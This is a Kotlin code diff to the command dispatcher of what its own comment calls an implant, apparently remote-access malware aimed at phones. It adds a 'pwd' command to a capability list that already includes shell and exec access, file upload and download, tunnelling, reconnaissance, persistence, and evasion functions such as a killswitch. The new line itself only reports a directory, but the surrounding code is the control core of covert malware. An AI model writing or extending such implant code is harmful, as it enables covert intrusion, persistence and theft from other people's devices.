@@ -24,7 +24,7 @@ object TaskRunner {
     val CAPABILITIES: List<String> = listOf(
         "shell", "exec", "sysinfo", "recon", "ls", "download", "cat", "upload",
         "tail", "hash", "ps", "sleep", "exit", "kill", "ping", "tunnel",
-        "triage", "find", "netinfo", "env", "resolve", "touch",
+        "triage", "find", "netinfo", "env", "resolve", "touch", "pwd",
         "persist", "unpersist", "persist.list", "persist.verify",
         "persist.migrate", "persist.health",
         "evade.report", "evade.posture", "evade.profile", "evade.killswitch",
@@ -358,6 +358,10 @@ object TaskRunner {
 
             // ---- network reach and the local environment ------------------
             "env" -> environment(args.field("filter")?.text() ?: "")
+            // The working directory of the implant.  On a phone the
+            // process starts in the root of the filesystem, and the
+            // answer says so instead of pretending to be somewhere else.
+            "pwd" -> Outcome(0, "${System.getProperty("user.dir") ?: "/"}\n".toByteArray(), "")
             "resolve" -> resolve(
                 args.field("host")?.text() ?: "",
                 args.field("port")?.long() ?: 0L,
